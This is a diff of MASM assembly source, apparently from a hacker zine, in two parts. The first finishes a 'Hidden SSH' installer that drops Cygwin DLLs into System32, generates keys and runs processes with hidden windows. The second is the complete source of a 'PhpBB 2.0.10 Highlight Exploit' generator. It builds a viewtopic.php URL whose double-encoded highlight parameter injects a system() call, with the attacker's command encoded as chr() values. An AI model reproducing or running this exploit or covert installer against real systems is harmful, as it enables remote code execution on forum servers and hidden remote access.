+			Push OFFSET sz_Temp		; It's not yes ? So, we compare to no.
+			Push OFFSET sz_AnswerN
+			Call lstrcmpi
+				.IF EAX == 0
+				Push 10				; Gosh, answer is no. Ok, we reset the buffer, we say "Ok", and we jump to the next stage
+				Push OFFSET sz_Temp
+				Call RtlZeroMemory
+				
+				Push OFFSET sz_AllDone
+				Call StdOut
+				
+				Jmp  @TheLast
+				
+				.ELSEIF EAX != 0	; Hu, user has entered an incorrect answer. We re-ask.
+				Push 10
+				Push OFFSET sz_Temp
+				Call RtlZeroMemory
+				
+				Jmp  @CopyToWin
+				.ENDIF
+		.ELSEIF EAX == 0				; Hu, User has said "yes, I want to copy them !"
+		Push MAX_PATH
+		Push OFFSET sz_WinPath
+		Call GetWindowsDirectory		; So, we get the Windows path
+		
+		Push OFFSET sz_System32
+		Push OFFSET sz_WinPath
+		Call lstrcat					; We add the string \system32 to thep ath, and we obtains C:\Windows\System32
+		
+		Push OFFSET sz_WinPath			; We Set the current directory to the System32 folder
+		Call SetCurrentDirectory
+		
+		Mov sz_File, 10					; We move the value 10 to the variable sz_File
+		
+		Push OFFSET sz_Cygcrypto		; We extract again all dll
+		Call ExtractFile
+		
+		Push OFFSET sz_Cygconv
+		Call ExtractFile
+		
+		Push OFFSET sz_Cygminires
+		Call ExtractFile
+		
+		Mov sz_File, 14					; Because each resource is associated to a file, we move 14 to "jump" into the file we wanted
+		
+		Push OFFSET sz_Cygwin
+		Call ExtractFile
+		
+		Push OFFSET sz_Cygz
+		Call ExtractFile 
+		
+		Push OFFSET sz_AllDone			; We say "w00t, it's done !"
+		Call StdOut
+		.ENDIF
+		
+	@TheLast:
+	Mov  sz_Root,1						; Here is a "Icing's Defined Flag". Procedure check for the value of sz_Root. We set him to 1
+	Push OFFSET sz_Bin
+	Call ChangeDir						; We now can go into the "bin" directory
+	
+	Push STD_OUTPUT_HANDLE				; We get the StdOutput handle of our program
+	Call GetStdHandle
+	Mov  sz_Startup.hStdOutput, EAX		; We set him at the StdOutput of programs we should run
+	
+	Push STD_INPUT_HANDLE				; same for input :p
+	Call GetStdHandle
+	Mov  sz_Startup.hStdInput, EAX
+	
+	Push STD_ERROR_HANDLE				; and for StdError
+	Call GetStdHandle
+	Mov  sz_Startup.hStdError, EAX
+	
+	Mov  sz_Startup.dwFlags, STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES ; Here, we say "We have setted different settings. Please use them", for hStdInput/Output and WS_SHOW	
+	Mov  sz_Startup.wShowWindow, SW_HIDE 	; Here we say that the process should be hidden
+	Mov  sz_Startup.lpReserved, 0
+	Mov  sz_Startup.cb, SIZEOF sz_Startup		; we set the size of the structure
+	
+	Push OFFSET sz_Generating
+	Call StdOut								; We say "We are generating keys..."
+
+	Push OFFSET sz_keygen_1					; We run the first keygen mode ( DSA )
+	Call RunFile
+
+	Push OFFSET sz_keygen_2					; We run the second keygen mode ( RSA1 )
+	Call RunFile
+
+	Push OFFSET sz_keygen_3					; RSA ...
+	Call RunFile
+	
+	Push OFFSET sz_Users					; "Generating users / login" ..
+	Call StdOut
+	
+	Push OFFSET sz_MakeAll					; Run a makeall.bat that contains two commands
+	Call RunFile
+	
+	Push OFFSET sz_MakeAll					; delete the file ( it's now useless )
+	Call DeleteFile
+
+	Push 250
+	Push OFFSET sz_AnswerBuf
+	Call RtlZeroMemory
+	
+	Push 250
+	Push OFFSET sz_SlashCleared
+	Call RtlZeroMemory
+	
+	@AskService:
+	Push OFFSET sz_Service_Q
+	Call StdOut
+	
+	Push LENGTHOF sz_AnswerBuf
+	Push OFFSET sz_AnswerBuf
+	Call StdIn
+	
+	; ################################ Already explained :p #######################
+	
+	Lea ESI, OFFSET sz_AnswerBuf	
+	Lea EDI, OFFSET sz_SlashCleared
+	CLD								
+	
+	@ParsingEngine_serv:				
+	LODSB						
+	Cmp  AL,13					
+	Jnz  @NotEnter_serv				
+	Jz   @EnterFound_serv				
+	
+	@NotEnter_serv:						 
+	STOSB							
+	Test AL, AL						
+	Jne  @ParsingEngine_serv		
+	
+	@EnterFound_serv:
+	Mov AL, 0						
+	STOSB							; So we have Slashcleared with the user answer
+	
+	Push 250
+	Push OFFSET sz_AnswerBuf
+	Call RtlZeroMemory
+	
+	; ############################# Installation du service ####################
+	
+	
+	; ############################# Fun de l'install du service ###############
+	
+	Push OFFSET sz_SetupDone
+	Call StdOut
+	
+	RET
+
+	
+InstallProc EndP
+
+RunFile	proc param:DWORD
+	Push OFFSET sz_PInfo
+	Push OFFSET sz_Startup
+	Push 0
+	Push 0
+	Push NORMAL_PRIORITY_CLASS
+	Push TRUE
+	Push 0
+	Push 0
+	Push param
+	Push 0
+	Call CreateProcess
+	
+	Push 3000
+	Call Sleep
+
+	RET
+RunFile EndP
+
+ExtractFile proc param:DWORD
+Push OFFSET sz_Extracting
+Call StdOut
+
+	.IF sz_File <=28
+	Push OFFSET sz_Bin
+	Call StdOut
+	
+	.ELSEIF sz_File > 29
+		.IF sz_File <= 32
+		Push OFFSET sz_Sbin
+		Call StdOut
+		.ELSEIF sz_File == 33
+		Push OFFSET sz_C
+		Call StdOut
+		.ENDIF
+	.ENDIF
+
+Push OFFSET sz_Slash
+Call StdOut
+
+Push param
+Call StdOut
+
+Push 0
+Push FILE_ATTRIBUTE_NORMAL
+Push CREATE_NEW
+Push 0
+Push 0
+Push GENERIC_READ+GENERIC_WRITE
+Push param
+Call CreateFile
+
+.IF EAX != INVALID_HANDLE_VALUE
+	Mov  hFile, EAX
+	
+	Push RT_RCDATA
+	Push sz_File
+	Push 0
+	Call FindResource
+	
+	Mov  hTemp, EAX
+	
+	Push EAX
+	Push 0
+	Call LoadResource
+
+	Mov  hRes, EAX
+	
+	Push hTemp
+	Push 0
+	Call SizeofResource
+	
+	Push 0
+	Push OFFSET sz_BytesWritten
+	Push EAX
+	Push hRes
+	Push hFile
+	Call WriteFile
+	
+	Push hFile
+	Call CloseHandle
+	
+	Inc  sz_File
+	
+	Push OFFSET sz_OK
+	Call StdOut
+
+	RET
+	
+.ELSEIF EAX == INVALID_HANDLE_VALUE
+	Push OFFSET sz_Failed
+	Call StdOut
+	
+	Push EAX
+	Call CloseHandle
+	
+	Inc  sz_File
+	
+	RET
+.ENDIF
+	RET
+ExtractFile EndP
+
+@CreateDir proc param:DWORD
+Push OFFSET sz_Creating
+Call StdOut
+
+Push OFFSET sz_Slash
+Call StdOut
+
+Push param
+Call StdOut
+
+Push 0
+Push param
+Call CreateDirectory
+
+.IF EAX == TRUE
+Push OFFSET sz_OK
+Call StdOut
+
+Push EAX
+Call CloseHandle
+Ret
+
+.ELSEIF EAX == FALSE
+Mov  EBX, EAX
+Push OFFSET sz_Failed
+Call StdOut
+
+Ret
+.ENDIF
+@CreateDir endP
+
+CleanMem Proc				; Procedure to clean buffers
+Push 150
+Push OFFSET sz_Path
+Call RtlZeroMemory			; Fill the buffer "sz_Path" with 150 NULL caracters
+
+Push 250
+Push OFFSET sz_AnswerBuf
+Call RtlZeroMemory			; Bis repetitae ( placent, dedicace to Kinkey :-P )
+
+Push 10
+Push OFFSET sz_Temp	
+Call RtlZeroMemory			; Same thing as above, but for sz_Temp and with 10 null caracters
+	
+RET							; we return where we were :]
+CleanMem endP
+
+ChangeDir Proc param:DWORD
+Push OFFSET sz_MovingTo
+Call StdOut
+
+.IF sz_Root == 1
+Push OFFSET sz_Path
+Call StdOut
+.ENDIF
+
+Push OFFSET sz_Slash
+Call StdOut
+
+Push param
+Call StdOut
+
+	.IF sz_Root == 1
+	Push OFFSET sz_RootPath
+	Call SetCurrentDirectory
+	.ENDIF
+Push param
+Call SetCurrentDirectory
+
+.IF EAX == TRUE 
+Push OFFSET sz_OK
+Call StdOut
+.ELSEIF EAX == FALSE
+Push OFFSET sz_Failed
+Call StdOut
+.ENDIF
+	RET
+ChangeDir EndP
+
+End Start
+
+- [ Hidden SSH Source Code End.
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+-------
+-------
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+- [ PhpBB 2.0.10 Highlight Exploit Source Code
+
+.386
+.model	flat, stdcall
+option	casemap :none
+
+include		windows.inc
+include		user32.inc
+include		kernel32.inc
+include		comctl32.inc
+include 	masm32.inc
+
+includelib	masm32.lib
+includelib	user32.lib
+includelib	kernel32.lib
+includelib	comctl32.lib	
+
+DlgProc		PROTO	:DWORD,:DWORD,:DWORD,:DWORD
+
+.data
+sz_ViewTopic				DB	"viewtopic.php?t=",0
+sz_Highlight				DB	"&highlight=%2527%252esystem(chr(",0
+sz_Highlight_Middle			DB	")%252echr(",0
+sz_Highlight_End			DB	"))%252e%2527",0
+.data?
+hInstance					DD	?
+hChar						DD	?
+
+sz_Temp						DB	250 dup(?)
+sz_Command					DB	250 dup(?)
+sz_Result					DB	2500 dup(?)
+
+.const
+IDD_MAIN                        Equ 1000
+IDB_EXIT                        Equ 1001
+IDC_Generate                    Equ 1002
+IDC_STATIC1007                  Equ 1007
+IDC_STATIC1009                  Equ 1009
+IDC_Url                         Equ 1006
+IDC_Command                     Equ 1005
+IDC_Result                      Equ 1004
+IDC_STATIC1010                  Equ 1010
+IDC_STATIC1012                  Equ 1012
+IDC_STATIC1013                  Equ 1013
+IDC_Topic                       Equ 1011
+
+.code
+start:
+	Push 0
+	Call GetModuleHandle
+	Mov  hInstance, EAX
+	
+	Call InitCommonControls
+	
+	Push 0
+	Push OFFSET DlgProc
+	Push 0
+	Push IDD_MAIN
+	Push hInstance
+	Call DialogBoxParam
+	
+	Push 0
+	Call ExitProcess
+
+DlgProc proc hWin:DWORD,uMsg:DWORD,wParam:DWORD,lParam:DWORD
+
+	.IF	uMsg == WM_INITDIALOG
+		Push 0
+		Push hInstance
+		Call LoadIcon
+		
+		Push EAX
+		Push 1
+		Push WM_SETICON
+		Push hWin
+		Call SendMessage
+		
+	.ELSEIF uMsg == WM_COMMAND
+		.IF	wParam == IDB_EXIT
+			Push 0
+			Push 0
+			Push WM_CLOSE
+			Push hWin
+			Call SendMessage
+		.ELSEIF wParam == IDC_Generate
+			Push SIZEOF sz_Temp
+			Push OFFSET sz_Temp
+			Push IDC_Url
+			Push hWin
+			Call GetDlgItemText
+			
+			Push OFFSET sz_Temp
+			Push OFFSET sz_Result
+			Call lstrcat
+			
+			Push SIZEOF sz_Temp
+			Push OFFSET sz_Temp
+			Call RtlZeroMemory
+			
+			Push OFFSET sz_ViewTopic
+			Push OFFSET sz_Result
+			Call lstrcat
+			
+			Push SIZEOF sz_Temp
+			Push OFFSET sz_Temp
+			Push IDC_Topic
+			Push hWin
+			Call GetDlgItemText
+			
+			Push OFFSET sz_Temp
+			Push OFFSET sz_Result
+			Call lstrcat
+			
+			Push SIZEOF sz_Temp
+			Push OFFSET sz_Temp
+			Call RtlZeroMemory
+			
+			Push OFFSET sz_Highlight
+			Push OFFSET sz_Result
+			Call lstrcat
+			
+			Push SIZEOF sz_Temp
+			Push OFFSET sz_Temp
+			Push IDC_Command
+			Push hWin
+			Call GetDlgItemText
+			
+			Xor EBX, EBX
+			
+			Push OFFSET sz_Temp
+			Call lstrlen
+			Mov EBX, EAX
+			
+			Mov ESI, OFFSET sz_Temp
+			
+			@Loop:
+				Mov EDI, OFFSET hChar
+				Lodsb
+				Cmp EBX, 1
+				Je  @EndOfString
+				Stosb
+				
+				Push OFFSET sz_Command
+				Push hChar
+				Call dw2a
+				
+				Push OFFSET sz_Command
+				Push OFFSET sz_Result
+				Call lstrcat
+				
+				Push OFFSET sz_Highlight_Middle
+				Push OFFSET sz_Result
+				Call lstrcat
+
+				Mov  hChar, 0
+				
+				Push SIZEOF sz_Command
+				Push OFFSET sz_Command
+				Call RtlZeroMemory
+
+				Dec EBX
+				Jmp @Loop
+				
+			@EndOfString:
+				Stosb
+				
+				Push OFFSET sz_Command
+				Push hChar
+				Call dw2a
+				
+				Push OFFSET sz_Command
+				Push OFFSET sz_Result
+				Call lstrcat
+				
+				Push SIZEOF sz_Command
+				Push OFFSET sz_Command
+				Call RtlZeroMemory
+
+			@End:
+				Push OFFSET sz_Highlight_End
+				Push OFFSET sz_Result
+				Call lstrcat
+				
+				Push OFFSET sz_Result
+				Push IDC_Result
+				Push hWin
+				Call SetDlgItemText
+				
+				Push SIZEOF sz_Result
+				Push OFFSET sz_Result
+				Call RtlZeroMemory
+
+		.ENDIF
+	.ELSEIF	uMsg == WM_CLOSE
+		Push 0
+		Push hWin
+		Call EndDialog
+
+	.ENDIF
+
+	xor	eax,eax
+	ret
+DlgProc endp
+
+end start
+
+	- [ PhpBB 2.0.10 Exploit Source Code End
+
+
+
+
+
+
+
+    -- [ Icingtaupe
